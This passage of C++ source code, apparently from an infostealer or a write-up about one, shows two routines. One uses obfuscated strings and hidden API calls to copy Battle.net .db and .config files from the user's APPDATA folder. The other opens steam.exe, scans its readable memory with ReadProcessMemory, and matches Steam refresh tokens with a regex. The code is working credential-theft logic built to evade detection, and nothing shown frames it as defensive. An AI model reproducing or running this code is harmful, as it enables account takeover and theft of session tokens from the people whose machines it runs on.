std::string battleNetFolder = std::string(getenv(OBF("APPDATA"))) + "\\" + OBF("Battle.net");
for (const auto& file : fs::directory_iterator(battleNetFolder)) {
  if (!fs::is_directory(file) && (file.path().extension() == OBF(".db") || file.path().extension() == OBF(".config"))) {
    HiddenCalls::CopyFileA(file.path().string().c_str(), (targetDir + "\\" + file.path().filename().string()).c_str(), FALSE);
  }
}

// Steam - Opens a handle to Steam.exe and searches memory for regex
HANDLE hProcess = OpenProcessByName(L"steam.exe");
std::regex tokenPattern(R"(eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0[0-9a-zA-Z\.\-_]+)");
std::vector<std::string> tokens = ScanProcessMemory(hProcess, tokenPattern);

if (!tokens.empty()) {
    for (const std::string& token : tokens) {
        std::cout << "Refresh token: " << token << "\n";
    }
}


if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE) == PAGE_READWRITE) {
  std::vector<char> buffer(mbi.RegionSize);
  SIZE_T bytesRead;

  if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
    std::vector<std::string> extracted = ExtractStringsByRegex(buffer);
    results.insert(results.end(), extracted.begin(), extracted.end());
  }
}
address = reinterpret_cast<LPBYTE>(mbi.BaseAddress) + mbi.RegionSize;
```
